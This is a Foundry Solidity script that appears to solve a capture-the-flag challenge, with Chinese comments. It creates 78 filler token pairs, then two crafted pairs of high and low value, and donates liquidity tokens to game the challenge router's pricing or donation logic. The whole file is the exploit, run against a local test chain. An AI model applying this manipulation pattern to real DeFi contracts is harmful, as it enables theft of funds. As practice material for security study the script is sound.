// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.17;

// import "forge-ctf/CTFDeployment.sol";
import 'forge-std/console2.sol';
import 'forge-std/Script.sol';
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "src/Challenge.sol";
import "src/Router.sol";
import "src/PairFactory.sol";
import "src/Pair.sol";
import "src/TokenFactory.sol";
import "src/Token.sol";
import "src/FlagCharity.sol";

contract Solve is Script {
    Router internal router;
    address internal player;

    uint256 TOKEN_NUM = 26;
    address[] internal tokens;

    uint256 internal pairNum = 0;
    
    // TokenFactory public tokenFactory;
    // PairFactory public pairFactory;
    // FlagCharity public flagCharity;

    function setUp() internal {
        // super.setUp();
        
        // vm.startBroadcast(system);

        router = Router(0x12975173B87F7595EE45dFFb2Ab812ECE596Bf84);
        string memory mnemonic = "test test test test test test test test test test test junk";
        uint256 privateKey = vm.deriveKey(mnemonic, 0);
        player = vm.rememberKey(privateKey);

        // tokenFactory = router.tokenFactory();

        // pairFactory = router.pairFactory();

        // flagCharity = router.flagCharity();

        // vm.stopBroadcast();

        vm.label(address(router), 'router');
        vm.label(player, "player");
        // vm.label(challenge, 'challenge');
    }

    function createToken() internal {
        tokens = new address[](TOKEN_NUM);
        for (uint256 i = 0; i < TOKEN_NUM; i++) {
            tokens[i] = TokenFactory(address(router)).createToken("Token", "TKN");
            router.listing(tokens[i], uint256(1));
            router.mint(tokens[i], 1);
        }
    }

    function createPair() internal {
        for (uint256 i = 0; i < TOKEN_NUM-1; i++) {
            for (uint256 j = i + 1; j < TOKEN_NUM; j++) {
                if (tokens[i%TOKEN_NUM] == tokens[j%TOKEN_NUM]) continue;
                address pair = router.createPair(tokens[i%TOKEN_NUM], tokens[j%TOKEN_NUM]);
                pairNum += 1;
                if (pairNum == 79) break;
            }
            if (pairNum == 79) break;
        }
    }

    function expoit() internal {
        vm.startBroadcast(player);
        // 创建高价值低流动性代币对 - 第79个
        address token1 = router.createToken("Token1", "TKN1");
        router.listing(token1, uint256(20 ether /2000));
        router.mint(token1, 2000);
        
        address token2 = router.createToken("Token2", "TKN2");
        router.listing(token2, uint256(20 ether/2000));
        router.mint(token2, 2000);

        address pair = router.createPair(token1, token2);
        pairNum += 1;
        console2.log(router.priceOf(pair));

        Token(token1).transfer(pair, 2000);
        Token(token2).transfer(pair, 2000);

        uint256 pairAmount_0 = Pair(pair).mint(player);

        // 创建低价值高流动性代币对 - 第八十个
        address token3 = router.createToken("Token3", "TKN3");
        router.listing(token3, uint256(1));
        router.mint(token3, 20 ether);
        
        address token4 = router.createToken("Token4", "TKN4");
        router.listing(token4, uint256(1));
        router.mint(token4, 20 ether);

        address pair2 = router.createPair(token3, token4);
        pairNum += 1;

        Token(token3).transfer(pair2, 20 ether);
        Token(token4).transfer(pair2, 20 ether);

        uint256 pairAmount_1 = Pair(pair2).mint(player);
        
        Token(pair).approve(address(router), type(uint256).max);
        Token(pair2).approve(address(router), type(uint256).max);
        // router.donate(pair, pairAmount_0);
        router.donate(pair2, pairAmount_1);
        vm.stopBroadcast();
    }

    function run() external {
        setUp();

        // 创建78个无用的池子
        vm.startBroadcast(player);
        createToken();
        createPair();
        console2.log("pairNum", pairNum);
        console2.log("totalMint:", router.totalMint());
        vm.stopBroadcast();
        
        expoit();

    }
}
